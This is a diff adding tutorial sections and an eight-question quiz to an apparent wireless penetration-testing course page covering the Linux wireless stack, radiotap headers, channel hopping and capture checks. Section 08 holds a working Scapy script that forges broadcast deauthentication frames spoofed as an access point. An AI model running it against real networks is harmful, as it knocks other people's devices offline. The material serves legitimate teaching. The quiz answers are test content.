@@ -155,6 +155,27 @@
     .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
     .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }
 
+    /* Quiz */
+    .quiz-container { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:28px; margin:24px 0; }
+    .quiz-container h3 { font-size:14px; color:var(--accent); margin-bottom:20px; display:flex; align-items:center; gap:8px; }
+    .quiz-question { margin-bottom:28px; }
+    .quiz-question .q-text { font-size:14px; color:var(--text-head); margin-bottom:14px; line-height:1.5; }
+    .quiz-question .q-num { font-family:var(--font-mono); font-size:11px; color:var(--accent); margin-bottom:6px; }
+    .option-list { display:flex; flex-direction:column; gap:8px; }
+    .option-btn { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:10px 16px; color:var(--text); text-align:left; cursor:pointer; font-size:13px; transition:all 0.15s; font-family:var(--font-body); }
+    .option-btn:hover { border-color:var(--accent); color:var(--text-head); }
+    .option-btn.correct { border-color:var(--accent2); background:rgba(63,185,80,0.08); color:var(--accent2); }
+    .option-btn.wrong { border-color:var(--accent3); background:rgba(247,129,102,0.08); color:var(--accent3); }
+    .option-btn:disabled { cursor:default; }
+    .quiz-feedback { margin-top:10px; font-size:13px; padding:10px 14px; border-radius:6px; display:none; line-height:1.5; }
+    .quiz-feedback.show { display:block; }
+    .quiz-feedback.correct-fb { background:rgba(63,185,80,0.08); border:1px solid rgba(63,185,80,0.3); color:var(--accent2); }
+    .quiz-feedback.wrong-fb { background:rgba(247,129,102,0.08); border:1px solid rgba(247,129,102,0.3); color:var(--accent3); }
+    .quiz-score { display:none; text-align:center; padding:20px; border-top:1px solid var(--border); margin-top:20px; }
+    .quiz-score.show { display:block; }
+    .score-num { font-size:3rem; font-weight:700; color:var(--accent); font-family:var(--font-mono); }
+    .score-label { font-size:14px; color:var(--text-dim); margin-top:4px; }
+
     ::-webkit-scrollbar { width:6px; height:6px; }
     ::-webkit-scrollbar-track { background:var(--bg); }
     ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
@@ -485,6 +506,305 @@
       </div>
     </section>
 
+    <!-- Section 6: Linux Wireless Stack -->
+    <section id="stack">
+      <h2><span class="section-num">06</span> The Linux Wireless Stack: cfg80211 &amp; mac80211</h2>
+      <p>Understanding why some adapters behave differently requires knowing where each driver sits in the kernel stack.</p>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Layer</th><th>Component</th><th>Role</th></tr></thead>
+          <tbody>
+            <tr><td>Userspace</td><td><code>iw</code>, <code>airmon-ng</code>, <code>hostapd</code></td><td>Issue nl80211 netlink commands</td></tr>
+            <tr><td>Kernel API</td><td><code>cfg80211</code> via <code>nl80211</code></td><td>Mode changes, scan results, regulatory, power</td></tr>
+            <tr><td>Protocol stack</td><td><code>mac80211</code></td><td>Frame aggregation, QoS, rate control — used by ath9k, mt76</td></tr>
+            <tr><td>Vendor driver</td><td><code>88XXau</code> (RTL8812AU)</td><td>Bypasses mac80211 → direct cfg80211; requires out-of-tree driver</td></tr>
+            <tr><td>Hardware</td><td>Wi-Fi chipset</td><td>RF, modulation, PHY layer</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout info">
+        <span class="ci">&#128268;</span>
+        <div><strong>Why RTL8812AU behaves differently:</strong> It uses a full-MAC vendor driver that bypasses <code>mac80211</code>. This means injection flags like <code>control</code> and <code>other_bss</code> have different effects, and the driver must be manually installed via DKMS — it is not in the mainline kernel.</div>
+      </div>
+    </section>
+
+    <!-- Section 7: Radiotap Header -->
+    <section id="radiotap">
+      <h2><span class="section-num">07</span> The Radiotap Header</h2>
+      <p>
+        Every captured and injected frame in monitor mode is prepended with a <strong>radiotap header</strong> —
+        a variable-length metadata structure that carries PHY-layer information. Tools like
+        <code>aireplay-ng</code> and <code>scapy</code> use it to control injection parameters.
+      </p>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Field</th><th>Value Example</th><th>Meaning for Injection</th></tr></thead>
+          <tbody>
+            <tr><td><code>Rate</code></td><td><code>2</code> (= 1 Mbps)</td><td>TX data rate. Lower = more compatible. aireplay-ng defaults to 1 Mbps.</td></tr>
+            <tr><td><code>Channel</code></td><td><code>2437</code> MHz</td><td>Frequency. Must match target AP channel.</td></tr>
+            <tr><td><code>TX Flags</code></td><td><code>0x0008</code></td><td>Don't wait for ACK — used in rapid deauth floods.</td></tr>
+            <tr><td><code>Signal</code></td><td><code>-55</code> dBm</td><td>RX signal strength (read-only in captures).</td></tr>
+            <tr><td><code>MCS</code></td><td>MCS index 0–31</td><td>802.11n HT rates (used for 802.11n injection).</td></tr>
+            <tr><td><code>Antenna</code></td><td><code>0</code></td><td>Which antenna to use (0 = auto).</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout tip">
+        <span class="ci">&#128161;</span>
+        <div>In <strong>Wireshark</strong>, expand any frame's <em>IEEE 802.11 radio information</em> section to see the full radiotap metadata — including the exact data rate, channel, and signal strength of each captured frame.</div>
+      </div>
+    </section>
+
+    <!-- Section 8: Scapy Injection -->
+    <section id="scapy">
+      <h2><span class="section-num">08</span> Scapy — Custom Frame Injection in Python</h2>
+      <p>
+        For full control over every bit in a frame — fuzzing, non-standard subtypes, automation —
+        use <strong>Scapy</strong>. It builds the frame and radiotap header from scratch in Python.
+      </p>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">scapy-deauth.py — Custom deauth injection</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-scapy')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-scapy"><span class="cmt">#!/usr/bin/env python3</span>
+<span class="cmt"># sudo python3 scapy-deauth.py</span>
+<span class="cmt"># Requires: pip3 install scapy && interface in monitor mode</span>
+
+<span class="out">from scapy.all import *</span>
+<span class="out">from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap</span>
+
+<span class="out">IFACE     = <span class="str">"wlan0mon"</span></span>
+<span class="out">AP_MAC    = <span class="str">"AA:BB:CC:DD:EE:FF"</span>   <span class="cmt"># Target AP BSSID</span></span>
+<span class="out">CLIENT    = <span class="str">"ff:ff:ff:ff:ff:ff"</span>   <span class="cmt"># Broadcast = disconnect ALL clients</span></span>
+
+<span class="out">frame = (</span>
+<span class="out">    RadioTap()                    /  <span class="cmt"># Radiotap: auto-filled (1 Mbps, 2.4 GHz)</span></span>
+<span class="out">    Dot11(</span>
+<span class="out">        type=<span class="str">0</span>,                   <span class="cmt"># 0 = Management frame</span></span>
+<span class="out">        subtype=<span class="str">12</span>,               <span class="cmt"># 12 = Deauthentication</span></span>
+<span class="out">        addr1=CLIENT,             <span class="cmt"># Receiver (victim)</span></span>
+<span class="out">        addr2=AP_MAC,             <span class="cmt"># Transmitter: spoofed as AP</span></span>
+<span class="out">        addr3=AP_MAC              <span class="cmt"># BSSID</span></span>
+<span class="out">    )                             /</span>
+<span class="out">    Dot11Deauth(reason=<span class="str">7</span>)        <span class="cmt"># Reason 7: nonassociated STA</span></span>
+<span class="out">)</span>
+
+<span class="out">sendp(frame, iface=IFACE, count=<span class="str">10</span>, inter=<span class="str">0.1</span>, verbose=<span class="str">True</span>)</span>
+<span class="out-ok"># Sent 10 packets.</span></div>
+      </div>
+
+      <div class="callout attack">
+        <span class="ci">&#9889;</span>
+        <div><strong>Attack relevance:</strong> This is the exact frame structure that <code>aireplay-ng -0</code> generates internally. Writing it in Scapy teaches you the precise bit layout — critical for understanding why 802.11w (PMF) blocks it and how WPA3 defends against forged deauths.</div>
+      </div>
+    </section>
+
+    <!-- Section 9: Channel Hopping -->
+    <section id="hopping">
+      <h2><span class="section-num">09</span> Channel Hopping vs. Locking</h2>
+      <p>
+        The decision to hop or lock determines what you see. Get it wrong and you either miss the target entirely
+        or miss frames on its channel.
+      </p>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Mode</th><th>Coverage</th><th>Frame Loss</th><th>When to Use</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><strong>Hopping</strong> (airodump-ng default)</td>
+              <td style="color:var(--accent2)">All channels</td>
+              <td style="color:var(--accent3)">Miss frames during dwell elsewhere</td>
+              <td>Reconnaissance phase — find targets</td>
+            </tr>
+            <tr>
+              <td><strong>Locked</strong> (airmon-ng start wlan0 N)</td>
+              <td style="color:var(--accent3)">Target channel only</td>
+              <td style="color:var(--accent2)">Never miss a frame on that channel</td>
+              <td>Attack phase — capture handshake, inject</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Channel hopping commands</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-hop')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-hop"><span class="cmt"># Default hop (2.4 GHz only)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airodump-ng wlan0mon</span>
+
+<span class="cmt"># Hop both bands (requires dual-band adapter)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airodump-ng <span class="flag">--band</span> <span class="str">abg</span> wlan0mon</span>
+<span class="cmt"># a = 5 GHz    b/g = 2.4 GHz</span>
+
+<span class="cmt"># kismet: simultaneous multi-channel — no frame loss</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo kismet <span class="flag">-c</span> wlan0<span class="str">:channel=6</span> <span class="flag">-c</span> wlan1<span class="str">:channel=11</span></span>
+<span class="cmt"># Both channels monitored simultaneously with two adapters</span>
+
+<span class="cmt"># Lock to target channel before attacking</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo iw dev wlan0mon set channel <span class="str">6</span></span></div>
+      </div>
+    </section>
+
+    <!-- Section 10: Capture Quality -->
+    <section id="verify">
+      <h2><span class="section-num">10</span> Verifying Capture Quality</h2>
+      <p>Before any attack, confirm your adapter is actually capturing 802.11 frames — not Ethernet frames (a sign monitor mode failed).</p>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Capture quality checks</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-verify')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-verify"><span class="cmt"># tcpdump: should show 802.11 management frames, NOT ethernet</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo tcpdump <span class="flag">-i</span> wlan0mon <span class="flag">-c</span> <span class="str">5</span> <span class="flag">-e</span></span>
+<span class="out-ok">12:00:01 AA:BB:CC > Broadcast, Probe Request (0) [1.0* Mbit] SSID:""</span>
+<span class="out-ok">12:00:01 DD:EE:FF > Broadcast, Beacon (8) [1.0* Mbit] SSID:"HomeNet"</span>
+<span class="cmt"># ↑ Good — raw 802.11 frames with radiotap metadata</span>
+<span class="out-err"># ✗ Bad: if you see ARP or IP frames = NOT in monitor mode</span>
+
+<span class="cmt"># Wireshark filter: view only beacon frames</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo tshark <span class="flag">-i</span> wlan0mon <span class="flag">-Y</span> <span class="str">"wlan.fc.type_subtype == 8"</span> <span class="flag">-c</span> <span class="str">5</span></span>
+<span class="out-ok">  1 0.000000 aa:bb:cc:dd:ee:ff → Broadcast  802.11 Beacon frame, SN=1234, FN=0</span>
+<span class="out-ok">  2 0.102341 aa:bb:cc:dd:ee:ff → Broadcast  802.11 Beacon frame, SN=1235, FN=0</span>
+
+<span class="cmt"># Count frames per type (management/control/data)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">tshark <span class="flag">-r</span> capture.cap <span class="flag">-q</span> <span class="flag">-z</span> <span class="str">"io,stat,0"</span></span>
+<span class="out-ok">Management: 1248  Control: 3821  Data: 891</span>
+<span class="cmt"># All three types = healthy monitor capture</span></div>
+      </div>
+    </section>
+
+    <!-- Section 11: Quiz -->
+    <section id="quiz">
+      <h2><span class="section-num">11</span> Knowledge Check</h2>
+      <p>Test your understanding before moving to Module 03.</p>
+
+      <div class="quiz-container">
+        <h3>&#127358; Module 02 Quiz &nbsp;<span style="font-size:11px;color:var(--text-dim);font-weight:400">8 questions</span></h3>
+
+        <!-- Q1 -->
+        <div class="quiz-question" id="q1">
+          <div class="q-num">Question 1 of 8</div>
+          <div class="q-text">In managed mode, which frames does the hardware allow through to the driver?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q1',false)">All frames on the channel</button>
+            <button class="option-btn" onclick="answer(this,'q1',true)">Only frames addressed to its own MAC, broadcast, and multicast</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">Only encrypted frames from associated APs</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">Management and control frames only</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q1"></div>
+        </div>
+
+        <!-- Q2 -->
+        <div class="quiz-question" id="q2">
+          <div class="q-num">Question 2 of 8</div>
+          <div class="q-text">What is the purpose of the <code>nl80211</code> netlink API?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q2',false)">It is the driver for the RTL8812AU chipset</button>
+            <button class="option-btn" onclick="answer(this,'q2',true)">It is the modern kernel API that userspace tools like <code>iw</code> use to communicate with <code>cfg80211</code></button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">It handles frame aggregation and QoS in the mac80211 stack</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">It is a Wireshark protocol dissector for 802.11</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q2"></div>
+        </div>
+
+        <!-- Q3 -->
+        <div class="quiz-question" id="q3">
+          <div class="q-num">Question 3 of 8</div>
+          <div class="q-text">You run <code>aireplay-ng -9 wlan0mon</code> and get "No answer... Found 0 APs". The interface is confirmed in monitor mode. What is the most likely cause?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q3',false)">The RTL8812AU driver does not support injection</button>
+            <button class="option-btn" onclick="answer(this,'q3',true)">The interface is on a different channel than the target APs</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">WPA3 is protecting the APs from injection tests</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">The FCS is being calculated incorrectly</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q3"></div>
+        </div>
+
+        <!-- Q4 -->
+        <div class="quiz-question" id="q4">
+          <div class="q-num">Question 4 of 8</div>
+          <div class="q-text">What does the radiotap header field <code>TX Flags: 0x0008</code> instruct the driver to do?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q4',false)">Use antenna 0 for transmission</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">Transmit at 1 Mbps data rate</button>
+            <button class="option-btn" onclick="answer(this,'q4',true)">Do not wait for an ACK after transmitting the frame</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">Enable RTS/CTS exchange before transmission</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q4"></div>
+        </div>
+
+        <!-- Q5 -->
+        <div class="quiz-question" id="q5">
+          <div class="q-num">Question 5 of 8</div>
+          <div class="q-text">You enable promiscuous mode on your Wi-Fi adapter in managed mode. Which statement is correct?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q5',false)">You can now capture EAPOL handshakes from nearby networks</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">You can inject arbitrary 802.11 frames</button>
+            <button class="option-btn" onclick="answer(this,'q5',true)">You still only see traffic from your own associated network; this is NOT monitor mode</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">Beacon frames from all nearby APs are now visible</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q5"></div>
+        </div>
+
+        <!-- Q6 -->
+        <div class="quiz-question" id="q6">
+          <div class="q-num">Question 6 of 8</div>
+          <div class="q-text">In a Scapy deauth frame, <code>addr2=AP_MAC</code> sets which address field and why does it matter?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q6',false)">Address 1 — the destination MAC of the victim client</button>
+            <button class="option-btn" onclick="answer(this,'q6',true)">Address 2 — the transmitter/source MAC, which is spoofed to impersonate the AP so the client accepts the frame as legitimate</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">Address 3 — the BSSID used for frame filtering at the AP</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">Address 4 — the WDS bridge MAC used in mesh networks</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q6"></div>
+        </div>
+
+        <!-- Q7 -->
+        <div class="quiz-question" id="q7">
+          <div class="q-num">Question 7 of 8</div>
+          <div class="q-text">You run <code>tcpdump -i wlan0mon -c 5 -e</code> and see ARP and IP frames instead of 802.11 frames. What does this mean?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q7',false)">Monitor mode is working and you are capturing decrypted traffic</button>
+            <button class="option-btn" onclick="answer(this,'q7',true)">The adapter is NOT in monitor mode — it is still presenting as an Ethernet interface</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">You need to specify the 802.11 protocol filter in tcpdump</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">The radiotap header is being stripped by the driver</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q7"></div>
+        </div>
+
+        <!-- Q8 -->
+        <div class="quiz-question" id="q8">
+          <div class="q-num">Question 8 of 8</div>
+          <div class="q-text">You create a virtual monitor interface with <code>iw phy phy0 interface add wlan0mon type monitor</code> while wlan0 is connected to a channel-6 AP. On what channel will wlan0mon capture?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q8',false)">You can set wlan0mon independently to any channel</button>
+            <button class="option-btn" onclick="answer(this,'q8',true)">Channel 6 — both interfaces share the same physical radio and are locked to the same frequency</button>
+            <button class="option-btn" onclick="answer(this,'q8',false)">Channel 1 — virtual interfaces always default to channel 1</button>
+            <button class="option-btn" onclick="answer(this,'q8',false)">All channels simultaneously — virtual interfaces auto-hop</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q8"></div>
+        </div>
+
+        <div class="quiz-score" id="quizScore">
+          <div class="score-num" id="scoreNum">0/8</div>
+          <div class="score-label" id="scoreLabel"></div>
+        </div>
+      </div>
+    </section>
+
     <!-- Nav -->
     <div class="nav-footer">
       <a href="../module-01-linux-wireless-setup/" class="nav-btn prev">&#8592; Module 01: Linux Setup</a>
@@ -551,6 +871,78 @@
       btn.classList.add('copied');
       setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
     });
+  }
+
+  // ── Quiz ──────────────────────────────────────────────────────
+  const TOTAL_Q = 8;
+  const qAnswered = {};
+  const qFeedbacks = {
+    q1: {
+      correct: "Correct. In managed mode, the hardware filter only passes frames addressed to the adapter's own MAC, broadcast (FF:FF:FF:FF:FF:FF), and multicast addresses. Everything else — Beacons, Probe Requests, EAPOL from other sessions — is silently dropped.",
+      wrong: "Incorrect. Managed mode hardware filter passes only: frames to its own MAC address, broadcast, and multicast. All other frames are dropped. Monitor mode removes this filter entirely."
+    },
+    q2: {
+      correct: "Correct. nl80211 is the modern Netlink-based API that replaces the older WEXT (Wireless Extensions). Tools like iw, hostapd, and wpa_supplicant use nl80211 system calls to communicate with cfg80211 in the kernel.",
+      wrong: "Incorrect. nl80211 is the kernel Netlink API — the communication channel between userspace tools (iw, airmon-ng) and the cfg80211 wireless configuration subsystem. It replaced the older WEXT API."
+    },
+    q3: {
+      correct: "Correct. The most common cause of 'No answer... Found 0 APs' when monitor mode is confirmed is a channel mismatch. The adapter is listening on a channel with no AP traffic. Fix: sudo iw dev wlan0mon set channel N (where N is the AP's channel).",
+      wrong: "Incorrect. When monitor mode is confirmed but injection test finds 0 APs, the cause is almost always a channel mismatch. Lock the interface to the AP's channel first."
+    },
+    q4: {
+      correct: "Correct. TX Flags 0x0008 instructs the driver not to wait for an ACK frame after transmitting. This is used in rapid deauth floods where waiting for an ACK would slow down the attack.",
+      wrong: "Incorrect. TX Flags 0x0008 = 'Do not wait for ACK'. Rate is set by the Rate field (2 = 1 Mbps). Antenna is a separate field. RTS/CTS is a different TX flag value."
+    },
+    q5: {
+      correct: "Correct. Promiscuous mode on a wireless adapter in managed mode does NOT give you monitor mode. You still only receive traffic from your associated network, and frames arrive as Ethernet (802.3) — not raw 802.11. You cannot capture handshakes from other sessions.",
+      wrong: "Incorrect. Promiscuous mode on a managed-mode wireless adapter only gives you visibility into your own associated network's traffic. Monitor mode (RFMON) is completely different and requires explicitly setting the interface to monitor mode."
+    },
+    q6: {
+      correct: "Correct. addr2 is Address 2 — the Transmitter/Source MAC. In a deauth attack, setting it to the AP's MAC makes the victim client believe the deauth came from its legitimate AP. Since 802.11 has no source authentication (without PMF), the client accepts and disconnects.",
+      wrong: "Incorrect. addr2 = Address 2 = Transmitter/Source. This is the field that gets spoofed to the AP's MAC address so the victim believes the deauth originated from its legitimate AP. addr1 is the receiver (victim), addr3 is the BSSID."
+    },
+    q7: {
+      correct: "Correct. Seeing ARP and IP frames (Layer 3) in tcpdump on a 'wlan0mon' interface means the adapter is NOT actually in monitor mode — it is still presenting as an Ethernet device. Real monitor-mode output shows raw 802.11 frames with radiotap metadata.",
+      wrong: "Incorrect. If tcpdump shows ARP/IP Ethernet frames on wlan0mon, monitor mode is NOT active. In real monitor mode, you see raw 802.11 frame types: Beacon (8), Probe Request (4), Data, etc. — not Layer 3 protocols."
+    },
+    q8: {
+      correct: "Correct. Virtual interfaces share the same physical radio (phy). The radio can only tune to one frequency at a time. Since wlan0 is connected to a channel-6 AP, the entire phy0 is locked to channel 6 — wlan0mon also captures only channel 6. Independent channel control requires a separate physical adapter.",
+      wrong: "Incorrect. Virtual interfaces share the same physical radio. The hardware can only tune to one frequency. If wlan0 is on channel 6, wlan0mon is also on channel 6. To monitor a different channel simultaneously, you need a second physical adapter."
+    }
+  };
+
+  let qScore = 0;
+  let qCount = 0;
+
+  function answer(btn, qId, isCorrect) {
+    if (qAnswered[qId]) return;
+    qAnswered[qId] = true;
+    qCount++;
+    const qEl = document.getElementById(qId);
+    const buttons = qEl.querySelectorAll('.option-btn');
+    buttons.forEach(b => b.disabled = true);
+    const fb = document.getElementById('fb-' + qId);
+    if (isCorrect) {
+      btn.classList.add('correct');
+      qScore++;
+      fb.textContent = '✓ ' + qFeedbacks[qId].correct;
+      fb.className = 'quiz-feedback correct-fb show';
+    } else {
+      btn.classList.add('wrong');
+      fb.textContent = '✗ ' + qFeedbacks[qId].wrong;
+      fb.className = 'quiz-feedback wrong-fb show';
+      buttons.forEach(b => { if (b.onclick && b.onclick.toString().includes('true')) b.classList.add('correct'); });
+    }
+    if (qCount === TOTAL_Q) {
+      const scoreEl = document.getElementById('quizScore');
+      const numEl = document.getElementById('scoreNum');
+      const labelEl = document.getElementById('scoreLabel');
+      numEl.textContent = qScore + '/' + TOTAL_Q;
+      const pct = qScore / TOTAL_Q;
+      labelEl.textContent = pct === 1 ? 'Perfect — ready for Module 03!' : pct >= 0.75 ? 'Strong — review any missed questions.' : pct >= 0.5 ? 'Getting there — re-read the radiotap and stack sections.' : 'Re-read the monitor mode mechanics and kernel stack sections.';
+      numEl.style.color = pct === 1 ? 'var(--accent2)' : pct >= 0.625 ? 'var(--warn)' : 'var(--accent3)';
+      scoreEl.classList.add('show');
+    }
   }
 
   // Injection simulator
